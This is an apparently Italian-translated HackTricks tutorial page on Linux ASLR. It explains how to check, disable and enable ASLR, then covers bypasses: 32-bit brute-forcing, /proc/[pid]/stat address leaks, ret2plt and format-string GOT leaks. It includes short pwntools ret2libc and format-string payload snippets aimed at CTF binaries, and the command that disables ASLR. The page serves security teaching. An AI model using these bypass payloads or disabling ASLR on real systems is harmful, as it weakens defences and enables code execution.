# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informazioni di base

**Address Space Layout Randomization (ASLR)** √® una tecnica di sicurezza utilizzata nei sistemi operativi per **randomizzare gli indirizzi di memoria** utilizzati dai processi di sistema e applicazione. In questo modo, rende significativamente pi√π difficile per un attaccante prevedere la posizione di processi e dati specifici, come lo stack, l'heap e le librerie, mitigando cos√¨ alcuni tipi di exploit, in particolare i buffer overflow.

### **Controllare lo stato di ASLR**

Per **controllare** lo stato di ASLR su un sistema Linux, puoi leggere il valore dal file `/proc/sys/kernel/randomize_va_space`. Il valore memorizzato in questo file determina il tipo di ASLR applicato:

* **0**: Nessuna randomizzazione. Tutto √® statico.
* **1**: Randomizzazione conservativa. Le librerie condivise, lo stack, mmap(), la pagina VDSO sono randomizzati.
* **2**: Randomizzazione completa. Oltre agli elementi randomizzati dalla randomizzazione conservativa, la memoria gestita tramite `brk()` √® randomizzata.

Puoi controllare lo stato di ASLR con il seguente comando:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **Disabilitare ASLR**

Per **disabilitare** ASLR, imposta il valore di `/proc/sys/kernel/randomize_va_space` a **0**. Disabilitare ASLR non √® generalmente raccomandato al di fuori di scenari di test o debug. Ecco come puoi disabilitarlo:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Puoi anche disabilitare ASLR per un'esecuzione con:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **Abilitare ASLR**

Per **abilitare** ASLR, puoi scrivere un valore di **2** nel file `/proc/sys/kernel/randomize_va_space`. Questo richiede tipicamente privilegi di root. L'abilitazione della randomizzazione completa pu√≤ essere effettuata con il seguente comando:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **Persistenza Attraverso i Riavvii**

Le modifiche apportate con i comandi `echo` sono temporanee e verranno ripristinate al riavvio. Per rendere la modifica persistente, √® necessario modificare il file `/etc/sysctl.conf` e aggiungere o modificare la seguente riga:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
Dopo aver modificato `/etc/sysctl.conf`, applica le modifiche con:
```bash
sudo sysctl -p
```
Questo garantir√† che le impostazioni ASLR rimangano attive tra i riavvii.

## **Bypasses**

### Forzatura brute-force a 32 bit

PaX divide lo spazio degli indirizzi del processo in **3 gruppi**:

* **Codice e dati** (inizializzati e non inizializzati): `.text`, `.data` e `.bss` ‚Äî> **16 bit** di entropia nella variabile `delta_exec`. Questa variabile √® inizializzata casualmente con ogni processo e aggiunta agli indirizzi iniziali.
* **Memoria** allocata da `mmap()` e **librerie condivise** ‚Äî> **16 bit**, chiamata `delta_mmap`.
* **Lo stack** ‚Äî> **24 bit**, indicato come `delta_stack`. Tuttavia, utilizza effettivamente **11 bit** (dal 10¬∞ al 20¬∞ byte inclusi), allineati a **16 byte** ‚Äî> Questo porta a **524.288 possibili indirizzi reali dello stack**.

I dati precedenti sono per sistemi a 32 bit e l'entropia finale ridotta rende possibile bypassare ASLR riprovando l'esecuzione pi√π e pi√π volte fino a quando l'exploit non viene completato con successo.

#### Idee per la forzatura brute-force:

* Se hai un overflow abbastanza grande da ospitare un **grande NOP sled prima del shellcode**, potresti semplicemente forzare gli indirizzi nello stack fino a quando il flusso **salta sopra una parte del NOP sled**.
* Un'altra opzione per questo, nel caso in cui l'overflow non sia cos√¨ grande e l'exploit possa essere eseguito localmente, √® possibile **aggiungere il NOP sled e lo shellcode in una variabile d'ambiente**.
* Se l'exploit √® locale, puoi provare a forzare l'indirizzo base di libc (utile per sistemi a 32 bit):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se attacchi un server remoto, potresti provare a **forzare l'indirizzo della funzione `usleep` di `libc`**, passando come argomento 10 (per esempio). Se a un certo punto il **server impiega 10 secondi in pi√π per rispondere**, hai trovato l'indirizzo di questa funzione.

{% hint style="success" %}
Nei sistemi a 64 bit, l'entropia √® molto pi√π alta e questo non √® possibile.
{% endhint %}

### Informazioni Locali (`/proc/[pid]/stat`)

Il file **`/proc/[pid]/stat`** di un processo √® sempre leggibile da tutti e **contiene informazioni interessanti** come:

* **startcode** & **endcode**: Indirizzi sopra e sotto con il **TESTO** del binario
* **startstack**: L'indirizzo dell'inizio dello **stack**
* **start\_data** & **end\_data**: Indirizzi sopra e sotto dove si trova il **BSS**
* **kstkesp** & **kstkeip**: Indirizzi attuali di **ESP** e **EIP**
* **arg\_start** & **arg\_end**: Indirizzi sopra e sotto dove si trovano gli **argomenti cli**.
* **env\_start** &**env\_end**: Indirizzi sopra e sotto dove si trovano le **variabili d'ambiente**.

Pertanto, se l'attaccante si trova sullo stesso computer del binario sfruttato e questo binario non si aspetta il overflow da argomenti raw, ma da un diverso **input che pu√≤ essere creato dopo aver letto questo file**. √à possibile per un attaccante **ottenere alcuni indirizzi da questo file e costruire offset da essi per l'exploit**.

{% hint style="success" %}
Per ulteriori informazioni su questo file, controlla [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html) cercando `/proc/pid/stat`
{% endhint %}

### Avere una leak

* **La sfida √® fornire una leak**

Se ti viene fornita una leak (sfide CTF facili), puoi calcolare offset da essa (supponendo per esempio che tu conosca la versione esatta di libc utilizzata nel sistema che stai sfruttando). Questo esempio di exploit √® estratto da [**esempio da qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak) (controlla quella pagina per ulteriori dettagli):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

Abusando di un buffer overflow sarebbe possibile sfruttare un **ret2plt** per esfiltrare un indirizzo di una funzione dalla libc. Controlla:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

Proprio come in ret2plt, se hai una lettura arbitraria tramite una vulnerabilit√† di format strings √® possibile esfiltrare l'indirizzo di una **funzione libc** dal GOT. Il seguente [**esempio √® da qui**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
Puoi trovare ulteriori informazioni su Format Strings lettura arbitraria in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

Prova a bypassare ASLR abusando degli indirizzi all'interno dello stack:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
Impara e pratica AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Impara e pratica GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Supporta HackTricks</summary>

* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos github.

</details>
{% endhint %}
